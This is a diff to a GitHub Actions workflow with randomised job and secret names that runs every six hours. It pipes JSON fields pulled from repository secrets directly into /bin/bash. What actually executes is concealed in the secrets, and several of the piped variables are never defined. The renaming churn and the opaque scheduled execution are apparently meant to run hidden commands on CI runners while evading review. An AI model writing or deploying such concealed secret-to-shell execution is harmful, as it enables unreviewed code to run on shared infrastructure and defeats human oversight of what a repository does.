@@ -1,9 +1,8 @@
 name: wuqidong4645
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '42 1/6 * * *'
 
 jobs:
   build:
@@ -13,10 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuqidong4645
         env:
-          tmv43: ${{ secrets.tmv43 }}
+          gapym90: ${{ secrets.gapym90 }}
         run: |
-          echo $tmv43 | jq -r .ovdwi12914 | /bin/bash
-          echo $w2353 | jq -r .esmo7 | /bin/bash
-          echo $w5180 | jq -r .buooj4759 | /bin/bash
-          echo $w3156 | jq -r .vlx09 | /bin/bash
+          echo $gapym90 | jq -r .jmywq02416 | /bin/bash
+          echo $wugz75398 | jq -r .y9107 | /bin/bash
+          echo $jmc594 | jq -r .gkold77059 | /bin/bash
+          echo $dszbq67318 | jq -r .x6984 | /bin/bash
+          echo $apvo86 | jq -r .ros337 | /bin/bash
 
